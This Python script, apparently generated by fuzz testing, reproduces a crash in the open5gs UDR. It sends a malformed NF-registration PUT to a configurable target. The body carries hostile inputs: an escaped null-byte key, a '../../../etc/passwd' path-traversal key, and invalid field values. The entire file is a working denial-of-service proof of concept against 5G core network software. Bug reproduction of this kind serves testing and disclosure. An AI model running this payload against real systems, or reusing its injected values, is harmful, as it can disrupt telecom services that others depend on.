#!/usr/bin/env python3
# Crash reproduction for open5gs-udr (low)
# Detected: Sat May  9 08:33:29 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'PUT'
path = '/nnrf-nfm/v1/nf-instances/AUSF-fuzz-9976'
body = b'{"nfInstanceId": "", "nfType": "AMF", "nfStatus": "UNKNOWN_TYPE", "ipv4Addresses": ["172.23.0.20"], "fqdn": "amf.open5gs.local", "priority": 1, "capacity": 65535, "load": -1, "nfServices": [{"serviceInstanceId": "namf-comm-001", "serviceName": "namf-comm", "versions": [{"apiVersionInUri": "v1", "apiFullVersion": "1.0.0"}], "scheme": "http", "nfServiceStatus": "REGISTERED", "ipEndPoints": [{"ipv4Address": "172.23.0.20", "port": 7777}]}], "supi": "imsi-901700000000001", "\\u0000null_byte_296": "injected", "../../../etc/passwd": "path_traversal"}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
